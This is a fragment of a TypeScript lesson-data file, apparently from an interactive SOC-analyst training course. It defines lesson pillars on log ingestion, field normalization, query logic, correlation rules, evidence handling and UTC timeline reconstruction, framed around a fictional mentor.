            { id: 'pipe-transport', label: '2-3. TRANSPORT' },
            { id: 'pipe-parser', label: '4. PARSING (ECS)' },
            { id: 'pipe-indexer', label: '5-6. INDEX & SEARCH' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SOURCE HEALTH',
          subPillar: 'INGESTION LAG MONITOR',
          heading: 'Log Shipper Health & The Delayed Ingestion Trap',
          paragraph1:
            'Karthik poses a vital operational rule: "If a source stops sending, should you quietly assume the environment became quiet?"',
          paragraph2:
            'The learner answers firmly: "No. I should report the visibility issue through the correct process." Karthik approves: "Healthy data collection is part of trustworthy monitoring."',
          techBoxTitle: 'TECH BOX: Telemetry Lag & Transport Bottlenecks [Details]',
          techBoxAnalogy:
            'A live television broadcast lagging by 45 minutes: looking at the screen shows old plays while the actual live game has already ended.',
          techBoxDef:
            'Ingestion Lag is the time differential between an event\'s physical generation timestamp (@timestamp) and its indexing timestamp in the central repository.',
          techBoxWhy:
            'If database server FIN-DB-01 has a 45-minute buffer delay, an analyst querying "Last 15 Minutes" will miss an ongoing database breach entirely!',
          defaultAnimation: 'm05-source-health' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'hlth-active', label: 'WS-04: HEALTHY' },
            { id: 'hlth-lagging', label: 'FIN-DB: 45M LAG ⚠️' },
            { id: 'hlth-offline', label: 'SWITCH: OFFLINE 🔴' },
            { id: 'hlth-alert', label: 'HEALTH DASHBOARD' },
          ],
        },
      ];
    }

    // 3. M05-U2-C1: Fields, time ranges and filters
    if (chId === 'M05-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: STRUCTURED FIELDS',
          subPillar: 'ECS NORMALIZATION',
          heading: 'Structured Field Schema: Normalizing Chaos into Keywords',
          paragraph1:
            'Raw event strings are parsed into standardized key-value pairs matching Elastic Common Schema (ECS): `@timestamp`, `host.name`, `user.name`, and `destination.ip`.',
          paragraph2:
            'Separating the physical host (`BLR-BR-WS-04`) from the user credential (`FIN-OPS-01`) and temporary IP (`10.10.20.15`) prevents confusion between devices, accounts, and people.',
          techBoxTitle: 'TECH BOX: Elastic Common Schema (ECS) & CIM Standards [Details]',
          techBoxAnalogy:
            'A standard passport: whether issued in India, Germany, or Japan, nationality, birthdate, and passport number always occupy the exact same standardized box.',
          techBoxDef:
            'Schema Normalization maps disparate vendor log formats into uniform field keys, enabling single queries to search Windows, Linux, and cloud telemetry simultaneously.',
          techBoxWhy:
            'Allows SOC correlation rules to evaluate `user.name` consistently without writing separate rules for 50 different application log formats.',
          defaultAnimation: 'm05-field-schema' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fld-timestamp', label: '@timestamp' },
            { id: 'fld-hostname', label: 'host.name' },
            { id: 'fld-username', label: 'user.name' },
            { id: 'fld-ip', label: 'destination.ip' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TIME WINDOWS',
          subPillar: 'SCOPING & UTC SYNC',
          heading: 'The Time Window Changes the Answer',
          paragraph1:
            'Karthik demonstrates on console: "Start with the question, then choose the relevant fields and time window. Usually begin with a justified scope and expand deliberately."',
          paragraph2:
            'A search for workstation BLR-BR-WS-04 returns zero results under "Last 15 Minutes". Expanding to the documented incident window (02:00–04:00 UTC) instantly reveals the certutil.exe download.',
          techBoxTitle: 'TECH BOX: Temporal Scoping & Timezone Synchronization [Details]',
          techBoxAnalogy:
            'Looking for a lost package delivered at 2:00 PM by only checking your doorstep at 8:00 PM after the courier already left.',
          techBoxDef:
            'Temporal Scoping bounds search queries to precise chronological brackets, while Timezone Normalization synchronizes local branch offsets (+05:30 IST) to global UTC epoch time.',
          techBoxWhy:
            'Searching local time into a UTC-indexed database causes a 5.5-hour time shift that hides genuine security evidence.',
          defaultAnimation: 'm05-time-window' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'time-window-15m', label: 'LAST 15M (FAST)' },
            { id: 'time-window-24h', label: 'LAST 24H (SHIFT)' },
            { id: 'time-window-custom', label: 'INCIDENT BRACKET' },
            { id: 'time-utc-align', label: 'UTC SYNC (+05:30)' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ZERO-RESULTS TRIAGE',
          subPillar: '4-POINT VERIFICATION',
          heading: 'The 4-Point Zero-Result Triage Checklist',
          paragraph1:
            'Karthik asks: "What should you check before treating zero results as meaningful?" The learner answers: "Time range, zone, field names, filter values, and source coverage."',
          paragraph2:
            'Karthik affirms: "Good. We found relevant records by fixing the question, not by guessing." Never assume zero results means innocence without validating the 4-point checklist.',
          techBoxTitle: 'TECH BOX: Systematic Zero-Result Diagnostic Method [Details]',
          techBoxAnalogy:
            'A mechanic diagnosing an engine that won’t start: checking fuel, battery, spark plugs, and ignition switch before declaring the engine dead.',
          techBoxDef:
            'Zero-Result Diagnostic Checklist requires validating Time Bracket, Field Exactness, Query Syntax/Quotes, and Sensor Health before certifying negative evidence.',
          techBoxWhy:
            'Eliminates analyst search errors that allow active malware implants to remain undetected on enterprise networks.',
          defaultAnimation: 'm05-zero-results-check' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'chk-timerange', label: '1. TIME & ZONE' },
            { id: 'chk-fieldnames', label: '2. FIELD NAMES' },
            { id: 'chk-syntax', label: '3. SYNTAX & QUOTES' },
            { id: 'chk-coverage', label: '4. INGEST COVERAGE' },
          ],
        },
      ];
    }

    // 4. M05-U2-C2: Basic query logic
    if (chId === 'M05-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: BOOLEAN LOGIC',
          subPillar: 'AND, OR, NOT & PARENTHESES',
          heading: 'Questions Written as Logic: AND, OR, NOT Gates',
          paragraph1:
            'Karthik explains Boolean fundamentals: "AND requires both conditions to match; OR allows alternatives. Parentheses make combinations explicit and eliminate operator ambiguity."',
          paragraph2:
            'Combining `host.name: "BLR-BR-WS-04"` AND `(process.name: "cmd.exe" OR process.name: "powershell.exe")` ensures the host restriction applies to both command interpreters.',
          techBoxTitle: 'TECH BOX: Boolean Query Construction & Precedence [Details]',
          techBoxAnalogy:
            'Ordering lunch: "A burger AND (fries OR salad)" guarantees you get a burger with one side; omitting parentheses could bring you just salad.',
          techBoxDef:
            'Boolean Query Logic applies mathematical set operations (Conjunction AND, Disjunction OR, Negation NOT) to filter structured log indices with precision.',
          techBoxWhy:
            'Allows analysts to isolate malicious activity from millions of benign operational background events with laser precision.',
          defaultAnimation: 'm05-boolean-logic' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'gate-and', label: 'AND (NARROWS)' },
            { id: 'gate-or', label: 'OR (BROADENS)' },
            { id: 'gate-not', label: 'NOT (HAZARD) ⚠️' },
            { id: 'gate-paren', label: '( GROUPING )' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: QUERY DIALECTS',
          subPillar: 'KIBANA VS KUSTO VS SPL',
          heading: 'Query Dialects: Kibana KQL, Kusto KQL & Splunk SPL',
          paragraph1:
            'Karthik cautions: "Query languages differ. Our lab identifies its chosen language; Kusto KQL and Kibana KQL are not interchangeable despite sharing the acronym."',
          paragraph2:
            'Kibana uses intuitive key-value pairs (`host.name: "WS-04"`); Kusto uses pipeline commands (`SecurityEvent | where Computer == "WS-04"`); Splunk uses UNIX-style pipes (`index=windows host="WS-04"`).',
          techBoxTitle: 'TECH BOX: SIEM Query Dialects & Portability [Details]',
          techBoxAnalogy:
            'Speaking different languages with similar words: French and Spanish both use Latin roots, but sentences cannot be swapped word-for-word without translation errors.',
          techBoxDef:
            'SIEM Query Languages provide formal domain-specific syntax (KQL, Kusto, SPL, EQL) for querying, filtering, and aggregating time-series log documents.',
          techBoxWhy:
            'Prevents copy-paste syntax errors when moving between enterprise SIEM platforms like Elastic, Microsoft Sentinel, and Splunk.',
          defaultAnimation: 'm05-query-dialects' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'kql-kibana', label: 'KIBANA KQL' },
            { id: 'kql-kusto', label: 'KUSTO (SENTINEL)' },
            { id: 'kql-spl', label: 'SPLUNK SPL' },
            { id: 'kql-syntax-gate', label: 'SYNTAX INTEGRITY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: QUERY DOSSIER',
          subPillar: 'REPRODUCIBLE RESEARCH',
          heading: 'The Reproducible Query Dossier & The NOT Hazard',
          paragraph1:
            'Karthik poses a warning: "Could a broad NOT filter accidentally hide relevant evidence?" The learner answers: "Yes. Exclusions need a clear reason and checking."',
          paragraph2:
            'Excluding `NOT user.name: "SYSTEM"` hides attacker token impersonation. Always record the exact verbatim query and time bracket so another analyst can reproduce your search findings.',
          techBoxTitle: 'TECH BOX: The Exclusion Hazard & Scientific Reproducibility [Details]',
          techBoxAnalogy:
            'Filtering out all noise in a recording: filtering too aggressively can erase the faint whisper of the intruder speaking in the background.',
          techBoxDef:
            'Query Dossier records the exact query string, time bounds, index pattern, and justification for exclusions to ensure findings meet evidentiary audit standards.',
          techBoxWhy:
            'Guarantees that investigation findings can be validated independently by senior forensic investigators, auditors, or legal counsel.',
          defaultAnimation: 'm05-query-dossier' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dos-query-save', label: 'VERBATIM QUERY' },
            { id: 'dos-not-danger', label: 'NOT HAZARD ⚠️' },
            { id: 'dos-peer-repro', label: 'PEER TEST ✓' },
            { id: 'dos-audit', label: 'AUDIT PARAMS' },
          ],
        },
      ];
    }

    // 5. M05-U3-C1: Rules, correlation and alert output
    if (chId === 'M05-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CORRELATION ENGINE',
          subPillar: 'TEMPORAL JOINS',
          heading: 'Correlation Engine: Joins, Grouping & Temporal Windows',
          paragraph1:
            'Karthik teaches detection fundamentals: "Correlation joins or groups observations according to conditions; it does not automatically establish causation."',
          paragraph2:
            'A correlation rule joins an off-hours interactive logon on BLR-BR-WS-04 at 02:45:10Z with an outbound firewall session to foreign IP 185.220.101.4 at 02:45:14Z (Δ = 4s) inside a sliding 5-minute window.',
          techBoxTitle: 'TECH BOX: Complex Event Processing (CEP) & Correlation [Details]',
          techBoxAnalogy:
            'A security guard who notes someone entering a building at 2:00 AM (Event 1) and an office door lock being jimmied open at 2:02 AM (Event 2).',
          techBoxDef:
            'Event Correlation joins disparate log events sharing entity keys (IP, hostname, user) across temporal windows to identify attack patterns.',
          techBoxWhy:
            'Surfaces sophisticated multi-stage intrusions where individual actions appear benign in isolation but malicious when linked together.',
          defaultAnimation: 'm05-correlation-engine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'eng-join', label: 'MULTI-SOURCE JOIN' },
            { id: 'eng-grouping', label: 'ENTITY GROUPING' },
            { id: 'eng-window', label: 'SLIDING WINDOW' },
            { id: 'eng-output', label: 'CORRELATION != CAUSATION' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: RULE DISSECTOR',
          subPillar: 'LOGIC EXPRESSIONS',
          heading: 'Detection Rule Dissector: 4 Core Logic Blocks',
          paragraph1:
            'Karthik advises: "Understand an alert by reading the rule\'s conditions. Look at sources, grouping fields, thresholds, exclusions, and the time window."',
          paragraph2:
            'Every rule consists of 4 blocks: Ingestion Stream Filter (index & EventID), Conditional Expression (LogonType & Off-Hours), Frequency Threshold Gate (Count >= 5), and Alert Dispatch Payload.',
          techBoxTitle: 'TECH BOX: SIEM Detection Rule Architecture [Details]',
          techBoxAnalogy:
            'A thermostat: sensor measuring temperature (Input), threshold setting at 20°C (Condition), and turning on the furnace when it drops below (Action).',
          techBoxDef:
            'Detection Rule Architecture defines the deterministic logical pipeline from event ingestion filtering to threshold evaluation and alert ticket generation.',
          techBoxWhy:
            'Enables L1 analysts to understand why an alert fired rather than treating the alert title as an unexplained mystery.',
          defaultAnimation: 'm05-rule-dissector' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rule-stream', label: '1. INGEST STREAM' },
            { id: 'rule-condition', label: '2. CONDITIONS' },
            { id: 'rule-threshold', label: '3. THRESHOLD' },
            { id: 'rule-action', label: '4. ALERT PAYLOAD' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: THRESHOLD TUNING',
          subPillar: 'ALERT FIDELITY',
          heading: 'Dynamic Threshold Tuning & Alert Fatigue Control',
          paragraph1:
            'Karthik tests the apprentice: "If a threshold changes, can the number of alerts change even with the same underlying events?" The learner answers: "Yes. The detection logic changed."',
          paragraph2:
            'Karthik nods: "Exactly. Alert counts and event counts answer different questions." Setting threshold to 1 causes 1,420 alerts/day (fatigue); setting to 50 blinds the SOC; setting to 5 yields 12 actionable alerts.',
          techBoxTitle: 'TECH BOX: Detection Sensitivity & Alert Fatigue Control [Details]',
          techBoxAnalogy:
            'A car alarm: if a gust of wind sets it off, neighbors ignore it; if a brick through the window doesn’t trip it, it’s useless. It must be tuned to break-ins only.',
          techBoxDef:
            'Threshold Tuning balances detector sensitivity against operational triage capacity, minimizing false positives and false negatives.',
          techBoxWhy:
            'Protects analysts from alert fatigue so genuine critical incidents are never lost or ignored in noisy queues.',
          defaultAnimation: 'm05-threshold-tuning' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tune-thresh-low', label: 'THRESH: 1 (STORM)' },
            { id: 'tune-thresh-optimal', label: 'THRESH: 5 (TUNED ✓)' },
            { id: 'tune-thresh-high', label: 'THRESH: 50 (BLIND)' },
            { id: 'tune-fatigue', label: 'TUNING MAXIM' },
          ],
        },
      ];
    }

    // 6. M05-U3-C2: Application, identity, host, network and compliance examples
    if (chId === 'M05-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: MULTI-SOURCE MOSAIC',
          subPillar: 'THE 4 PANES',
          heading: 'The 4-Pane Multi-Source Evidence Mosaic',
          paragraph1:
            'Karthik displays the finance case across 4 labelled panes: Identity (Active Directory Event 4624), Host (Sysmon Event 1 certutil.exe), Application (Finance ERP 0 activity), and Network (Zeek conn.log 450 KB transfer).',
          paragraph2:
            'All 4 perspectives synchronize on timestamp 02:45:10 UTC to establish indisputable evidence: credentials were used, a remote binary was downloaded, and foreign C2 data transferred.',
          techBoxTitle: 'TECH BOX: Multi-Perspective Evidence Triangulation [Details]',
          techBoxAnalogy:
            'Cross-examining four independent witnesses: the guard at the gate (Identity), the camera in the hallway (Network), the desk computer logs (Host), and the ledger clerk (Application).',
          techBoxDef:
            'Multi-Perspective Triangulation corroborates an incident by synthesizing telemetry across identity, host, application, and network layers.',
          techBoxWhy:
            'Guarantees that an adversary cannot erase their tracks by deleting logs on a single compromised endpoint.',
          defaultAnimation: 'm05-source-mosaic' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mos-identity', label: '1. IDENTITY (DC-01)' },
            { id: 'mos-host', label: '2. HOST (SYSMON)' },
            { id: 'mos-application', label: '3. APP (FINANCE)' },
            { id: 'mos-network', label: '4. NETWORK (ZEEK)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DATA MINIMIZATION',
          subPillar: 'PRIVACY & DPDP',
          heading: 'Data Minimization & Forensic Privacy Filter',
          paragraph1:
            'Karthik asks: "Should you export unrelated personal data just because the interface allows it?" The learner replies: "No. I should minimise data and follow access and handling rules."',
          paragraph2:
            'Export only strictly necessary forensic observables (host, user, timestamp, IP, hash). Redact employee personal emails, payroll figures, and private browsing data in accordance with DPDP and GDPR.',
          techBoxTitle: 'TECH BOX: Forensic Data Minimization & Privacy Ethics [Details]',
          techBoxAnalogy:
            'A police officer searching a suspect’s backpack for a stolen watch: taking the watch as evidence, but leaving private letters and medical receipts untouched.',
          techBoxDef:
            'Data Minimization (ISO/IEC 27037 & DPDP/GDPR) restricts forensic evidence collection strictly to observables directly relevant to proving or disproving the incident.',
          techBoxWhy:
            'Protects employee fundamental privacy rights and ensures forensic evidence remains legally admissible in court.',
          defaultAnimation: 'm05-data-minimization' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'min-approved-fields', label: 'APPROVED FIELDS' },
            { id: 'min-pii-redacted', label: 'PII REDACTED ✓' },
            { id: 'min-compliance', label: 'COMPLIANCE SCOPE' },
            { id: 'min-vault', label: 'CASE WORKSPACE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: EVIDENCE PACKET',
          subPillar: 'SUPERVISED HANDOFF',
          heading: 'The Reproducible Evidence Packet & Supervisory Handoff',
          paragraph1:
            'The apprentice compiles the Case #2026-881 archive: raw log extracts, normalized field tables, process trees, and the query execution manifest, locked with a SHA-256 seal.',
          paragraph2:
            'Mentor Karthik commends the apprentice: "Correct. You now have a reproducible evidence packet, not merely a screenshot of a search." Case #2026-881 advances to formal Tier 2 incident response.',
          techBoxTitle: 'TECH BOX: Cryptographic Evidence Bundles & Chain of Custody [Details]',
          techBoxAnalogy:
            'A sealed legal evidence envelope with an unbroken wax stamp, containing certified documents and signed chain-of-custody forms.',
          techBoxDef:
            'Evidence Packet Bundle is a cryptographically hashed archive of raw logs, normalized tables, and query manifests that enables independent verification of findings.',
          techBoxWhy:
            'Screenshots can be faked or misinterpreted; a reproducible evidence packet provides bulletproof technical proof for senior incident handlers.',
          defaultAnimation: 'm05-evidence-packet' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pkt-bundle', label: 'EVIDENCE BUNDLE' },
            { id: 'pkt-query-manifest', label: 'QUERY MANIFEST' },
            { id: 'pkt-chain-hash', label: 'SHA-256 SEAL' },
            { id: 'pkt-lead-handoff', label: 'LEAD HANDOFF ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 06: LOG & EVENT ANALYSIS (Mentor Karthik) — 6 Chapters (18 Bespoke Pillars)
    // =========================================================================

    // 1. M06-U1-C1: Timestamp, source, fields and outcome
    if (chId === 'M06-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: LITERAL EVENT',
          subPillar: 'OBJECTIVE DECONSTRUCTION',
          heading: 'Literal Event Deconstruction & Objective Reporting',
          paragraph1:
            'Mentor Karthik guides the apprentice through EventID 4625 recorded on domain controller BLR-DC-01: "First describe the record literally. Describe what happened according to the audit provider before you interpret it."',
          paragraph2:
            'The raw record reports an authentication failure with SubStatus 0xC000006A (bad password). The apprentice learns that an operation failure proves access was prevented, not that a breach succeeded.',
          techBoxTitle: 'TECH BOX: Literal Log Deconstruction & Restraint [Details]',
          techBoxAnalogy:
            'A court stenographer typing the verbatim words spoken during a trial without assuming the defendant’s guilt or motives.',
          techBoxDef:
            'Literal Event Reading requires identifying the exact event identifier, provider, subject, target, and status code before proposing any investigative hypothesis.',
          techBoxWhy:
            'Prevents premature panic and speculative false conclusions that misdirect incident response teams and waste critical SLA hours.',
          defaultAnimation: 'm06-literal-event' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'lit-raw-text', label: 'RAW RECORD' },
            { id: 'lit-literal-desc', label: 'LITERAL DESC' },
            { id: 'lit-outcome-eval', label: 'OUTCOME EVAL' },
            { id: 'lit-restraint', label: 'RESTRAINT ✓' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TIMESTAMP TRIAD',
          subPillar: 'CONTINUUM SYNCHRONIZATION',
          heading: 'The Tri-Timestamp Continuum: Generation vs Ingestion vs Alert',
          paragraph1:
            'Every security event exists across three distinct temporal realities: Event Generation Time on host BLR-BR-WS-04, Ingestion Time at the SIEM cluster, and Alert Firing Time in the correlation queue.',
          paragraph2:
            'Mentor Karthik demonstrates: "Generation time is your true forensic chronological anchor. Alert creation time does not equal underlying activity time; buffering or network latency can separate them by hours."',
          techBoxTitle: 'TECH BOX: Timestamp Triad & Latency Drift [Details]',
          techBoxAnalogy:
            'A letter written on Monday, postmarked at the depot on Wednesday, and opened by the recipient on Friday. Investigating when an event occurred requires reading the letter’s date, not the mailbox delivery time.',
          techBoxDef:
            'The Timestamp Triad distinguishes between @timestamp (kernel event time), _index_time (indexer arrival), and alert.time (rule trigger).',
          techBoxWhy:
            'Chronological reconstruction fails if analysts sort by ingestion time, especially during network outages where queued logs arrive in massive delayed batches.',
          defaultAnimation: 'm06-timestamp-triad' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ts-generation', label: 'GENERATION TIME' },
            { id: 'ts-ingestion', label: 'INGESTION TIME' },
            { id: 'ts-alert-fired', label: 'ALERT FIRED' },
            { id: 'ts-skew-audit', label: 'NTP DRIFT' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: OUTCOME PRECISION',
          subPillar: 'FAILED != COMPROMISED',
          heading: 'Outcome Precision: Failed Operation != Compromise',
          paragraph1:
            'When examining Event 4625 for user account ramesh, the apprentice asks: "Can I write that the attacker compromised the workstation?" Mentor Karthik counters: "No. The record explicitly says failure."',
          paragraph2:
            'A failed logon proves the security barrier held against bad credentials. Without an accompanying Event 4624 (logon success), writing that an account was hijacked is an unsubstantiated analyst presumption.',
          techBoxTitle: 'TECH BOX: Status Code Precision & Access Prevention [Details]',
          techBoxAnalogy:
            'A burglar rattling a locked deadbolt door and walking away. The door handle rattled (event), but the room was not breached (failed outcome).',
          techBoxDef:
            'Outcome Precision enforces strict separation between security control denials (blocked packets, failed logons) and successful actions (established sessions, process creation).',
          techBoxWhy:
            'Preserves credibility and prevents unwarranted panic, avoiding premature host wipeouts when no actual breach occurred.',
          defaultAnimation: 'm06-outcome-precision' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'out-failure-eval', label: 'LOGON FAILURE' },
            { id: 'out-barrier-held', label: 'BARRIER HELD ✓' },
            { id: 'out-audit-status', label: 'STATUS CODES' },
            { id: 'out-presumption-trap', label: 'PRESUMPTION TRAP' },
          ],
        },
      ];
    }

    // 2. M06-U1-C2: Parsing and normalization concepts
    if (chId === 'M06-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PARSING PIPELINE',
          subPillar: 'GROK REGEX EXTRACTION',
          heading: 'Raw-to-Structured Parsing Pipeline with Grok Expressions',
          paragraph1:
            'Raw unstructured syslog emitted by the perimeter firewall arrives as an amorphous text string. The SIEM parsing pipeline applies Grok regex patterns to extract discrete key-value pairs.',
          paragraph2:
            'Mentor Karthik demonstrates how token matching extracts source IP, destination port, action, and user identity into indexed fields, transforming opaque characters into queryable technical data.',
          techBoxTitle: 'TECH BOX: Grok Parsing & Token Extraction [Details]',
          techBoxAnalogy:
            'An optical OCR scanner reading paper receipts and automatically sorting items into date, vendor, tax, and total amount columns in an accounting spreadsheet.',
          techBoxDef:
            'Grok Parsing utilizes named regular expressions to extract structured field variables from raw, unstructured log lines during the ingestion stream.',
          techBoxWhy:
            'Without parsing, analysts cannot perform numeric filtering, aggregations, or cross-source joins across enterprise security logs.',
          defaultAnimation: 'm06-parsing-pipeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pipe-raw-unparsed', label: 'RAW UNPARSED' },
            { id: 'pipe-grok-regex', label: 'GROK PATTERN' },
            { id: 'pipe-extracted-fields', label: 'EXTRACTED FIELDS' },
            { id: 'pipe-pipeline-latency', label: 'PARSER LAG' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: FIELD MAPPING',
          subPillar: 'CROSS-VENDOR NORMALIZATION',
          heading: 'Cross-Vendor Schema Normalization & Common Schemas',
          paragraph1:
            'Different vendors use conflicting field names for the same concept: Windows calls it TargetUserName, Linux auth.log calls it user, and Palo Alto calls it srcuser.',
          paragraph2:
            'The normalization engine aligns these divergent vendor dialects to standard Elastic Common Schema (ECS) or CIM fields (user.name, source.ip), enabling a single correlation rule to work across the entire fleet.',
          techBoxTitle: 'TECH BOX: Elastic Common Schema (ECS) & CIM Mapping [Details]',
          techBoxAnalogy:
            'A universal diplomatic translator at the United Nations converting speeches in French, Japanese, and Hindi into standard international English.',
          techBoxDef:
            'Log Normalization maps disparate vendor-specific field names into a unified taxonomic dictionary (ECS / OCSF / CIM) for consistent search and detection.',
          techBoxWhy:
            'Enables analysts to write vendor-agnostic detection rules that catch lateral movement across heterogeneous Windows, Linux, and cloud assets.',
          defaultAnimation: 'm06-field-mapping' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'map-windows-user', label: 'WINDOWS EVTX' },
            { id: 'map-linux-user', label: 'LINUX SYSLOG' },
            { id: 'map-pan-user', label: 'FIREWALL PAN' },
            { id: 'map-ecs-unified', label: 'UNIFIED ECS ✓' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: RAW VERIFICATION',
          subPillar: 'GROUND TRUTH AUDITING',
          heading: 'Parser Verification Against Raw Ground Truth',
          paragraph1:
            'Mentor Karthik reveals a dangerous trap: a misconfigured Grok pattern inverted destination IP and source IP, making outbound malware beacons appear as benign incoming requests.',
          paragraph2:
            'The apprentice toggles between the normalized view and event.original: "Whenever a query result looks anomalous or counter-intuitive, always inspect the raw ground truth text to verify the parser did not lie."',
          techBoxTitle: 'TECH BOX: Ground Truth Auditing & Parser Inversion [Details]',
          techBoxAnalogy:
            'A bookkeeper checking the physical paper receipt from the restaurant when the credit card statement shows a suspicious $5,000 charge for a lunch sandwich.',
          techBoxDef:
            'Raw Verification is the practice of inspecting the preserved event.original text to validate that normalization rules faithfully captured the physical source event.',
          techBoxWhy:
            'Silent parser bugs can reverse traffic direction, truncate filenames, or drop status codes, leading analysts to miss active intrusions.',
          defaultAnimation: 'm06-raw-verification' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'raw-parser-bug', label: 'PARSER BUG ⚠️' },
            { id: 'raw-ground-truth', label: 'RAW TRUTH' },
            { id: 'raw-discrepancy-fix', label: 'BUG RESOLUTION' },
            { id: 'raw-analyst-rule', label: 'GROUND TRUTH DOCTRINE' },
          ],
        },
      ];
    }

    // 3. M06-U2-C1: Build a simple timeline
    if (chId === 'M06-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: UTC TIMELINE',
          subPillar: 'CHRONOLOGICAL RECONSTRUCTION',
          heading: 'Chronological Event Ordering & UTC Normalization',
          paragraph1:
            'Investigating Case #2026-881, the apprentice pulls logs from the Bengaluru branch workstation, a London proxy server, and a California cloud tenant.',
          paragraph2:
            'Mentor Karthik insists on universal normalization: "Before you correlate a single packet, convert every local timestamp into standard Coordinated Universal Time (UTC / Zulu)."',
          techBoxTitle: 'TECH BOX: UTC Synchronization & ISO-8601 [Details]',
          techBoxAnalogy:
            'Air traffic controllers coordinating flights across continents: every radar station, pilot, and control tower operates strictly on Zulu (UTC) time.',
          techBoxDef:
            'UTC Normalization standardizes all timestamps from varying timezones into ISO-8601 UTC (YYYY-MM-DDThh:mm:ssZ) to reconstruct true physical causality.',
          techBoxWhy:
            'Without UTC normalization, an action that happened in Bengaluru at 10:00 AM IST would appear to occur 5.5 hours ahead of an event in London, scrambling cause-and-effect.',
          defaultAnimation: 'm06-utc-timeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'utc-master-clock', label: 'UTC ZULU MASTER' },
            { id: 'utc-blr-ist', label: 'BLR (UTC+5:30)' },
            { id: 'utc-lon-bst', label: 'LON (UTC+1:00)' },
            { id: 'utc-sfo-pdt', label: 'SFO (UTC-7:00)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: MIDNIGHT ROLLOVER',
          subPillar: 'DATE BOUNDARY CALENDAR TRAP',
          heading: 'The Midnight Date Boundary Rollover Trap',
          paragraph1:
            'A critical event occurred in Bengaluru at 01:10 AM on October 15. The apprentice searches the SIEM with a filter for October 15 UTC and finds zero matching records.',
          paragraph2:
            'Mentor Karthik explains the calendar rollover: 01:10 AM IST on October 15 is 19:40 UTC on October 14. Subtracting 5 hours and 30 minutes rolled the date backward by an entire calendar day.',
          techBoxTitle: 'TECH BOX: Midnight Date Boundary Shift [Details]',
          techBoxAnalogy:
            'Celebrating New Year’s Eve in Sydney at midnight: in London it is still 1:00 PM on the previous day. Searching a calendar requires knowing which day it is in UTC.',
          techBoxDef:
            'Midnight Rollover occurs when converting positive local timezone offsets before early morning causes the UTC timestamp to cross the midnight boundary into the prior calendar date.',
          techBoxWhy:
            'Queries bounded by local dates miss critical early-morning attacks completely because SIEM indexes partition records by UTC date boundaries.',
          defaultAnimation: 'm06-midnight-rollover' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'roll-ist-oct15', label: '01:10 IST (OCT 15)' },
            { id: 'roll-sub-offset', label: '-05:30 CONVERSION' },
            { id: 'roll-utc-oct14', label: '19:40 UTC (OCT 14)' },
            { id: 'roll-query-fix', label: 'INDEX BOUNDARY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: UNKNOWN OFFSET',
          subPillar: 'FORENSIC HONESTY',
          heading: 'Documenting Unknown Offsets & Time Uncertainty',
          paragraph1:
            'Legacy network switches and detached syslog appliances often record timestamps without timezone indicators: 2026-10-14 22:30:15 without a Z or offset notation.',
          paragraph2:
            'Mentor Karthik issues strict guidance: "Never guess an ambiguous timestamp. Mark the time offset explicitly as UNKNOWN and document a shaded uncertainty interval in the timeline."',
          techBoxTitle: 'TECH BOX: Ambiguous Timestamps & Uncertainty Windows [Details]',
          techBoxAnalogy:
            'An unlabelled snapshot photo showing an event in daylight: you cannot guess whether it was taken at dawn or dusk without independent corroborating evidence.',
          techBoxDef:
            'Unknown Offset Documentation records timestamps that lack timezone markers as unverified temporal intervals, preventing corrupted causal inferences.',
          techBoxWhy:
            'Guessing wrong by even 1 hour destroys the credibility of the entire case file and links unrelated employee actions to malicious events.',
          defaultAnimation: 'm06-unknown-offset' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'off-missing-zone', label: 'MISSING OFFSET ⚠️' },
            { id: 'off-shaded-range', label: 'UNCERTAINTY GAP' },
            { id: 'off-ntp-audit', label: 'CORROBORATING DHCP' },
            { id: 'off-honest-note', label: 'ACTIONABLE NOTE ✓' },
          ],
        },
      ];
    }

